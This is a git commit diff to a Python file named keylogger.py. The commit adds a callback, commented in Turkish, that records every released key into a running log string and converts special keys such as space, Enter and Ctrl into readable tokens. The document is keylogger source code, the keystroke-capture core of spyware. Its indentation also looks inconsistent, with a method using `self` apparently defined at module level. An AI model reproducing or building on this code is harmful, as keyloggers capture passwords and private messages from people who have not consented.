813c6df86b12e2fbfee2be169f10823109ae8afe
Berkay Oğuzhan <brky.gzhn1238@gmail.com>
2023-04-30 03:49:05 +0300

    Update keylogger.py

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -19,3 +19,26 @@ self.log =""
 # baslangic ve bitis tarih saatlerini kaydedin
 self.start_dt = datetime.now()
 self.end_dt = datetime.now()
+def callback(self, event):
+    """
+    Bu callback, herhangi bir klavye olayi meydana geldiginde cagirilir
+    (bu ornekte bir tus serbest birakildiginda)
+    """
+    ad = event.name
+    if len(ad) > 1:
+        # karakter degil, ozel bir tus (ornegin, ctrl, alt, vb.)
+        # [] icinde buyuk harfle yazilir
+        if ad == "space":
+            # "space" yerine " " kullan
+            ad = " "
+        elif ad == "enter":
+            # ENTER tusuna basildiginda yeni bir satir ekler
+            ad = "[ENTER]\n"
+        elif ad == "decimal":
+            ad = "."
+        else:
+            # bosluklari alt cizgiyle degistir
+            ad = ad.replace(" ", "_")
+            ad = f"[{ad.upper()}]"
+    # son olarak, tus adini global `self.log` degiskenimize ekleyin
+    self.log += ad
